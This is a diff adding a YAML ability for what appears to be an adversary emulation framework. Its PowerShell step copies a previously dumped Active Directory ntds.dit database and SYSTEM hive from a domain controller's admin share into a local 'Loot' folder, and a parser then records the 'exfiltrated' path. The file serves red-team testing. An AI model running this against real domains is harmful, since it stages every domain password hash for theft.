@@ -1,0 +1,33 @@
+- id: 2b3c4d5e-f6g7-8b9c-0d1e-ntds-copy
+  name: Collection - Stage NTDS from Remote Share
+  description: Copies the previously dumped ntds.dit and SYSTEM hive from the DC's temporary staging folder to the local machine.
+  tactic: collection
+  technique:
+    attack_id: T1074.001
+    name: "Data Staged: Local Data Staging"
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+        - source: file.ntds.staged_path_remote
+        - source: domain.user.impersonated
+        - source: domain.controller.hostname
+  platforms:
+    windows:
+      psh:
+        command: |
+          $dc = "#{domain.controller.hostname}";
+          $remotePath = "#{file.ntds.staged_path_remote}";
+          $localLootDir = "C:\Users\Public\Loot";
+          New-Item -Path $localLootDir -ItemType Directory -ErrorAction SilentlyContinue;
+
+          $fullRemotePath = "\\$dc\c$\$($remotePath.Split(':')[1])";
+          Copy-Item -Path $fullRemotePath -Recurse -Destination $localLootDir -Force;
+
+          if ((Test-Path "$localLootDir\IFM\Active Directory\ntds.dit")) {
+            Write-Host "NTDS-Exfiltrated-To: $localLootDir\IFM";
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'file.ntds.exfiltrated_path'
+              custom_parser_vals:
+                regex: 'NTDS-Exfiltrated-To:\s+(.*)'
+                edge_label: 'was_exfiltrated_to'
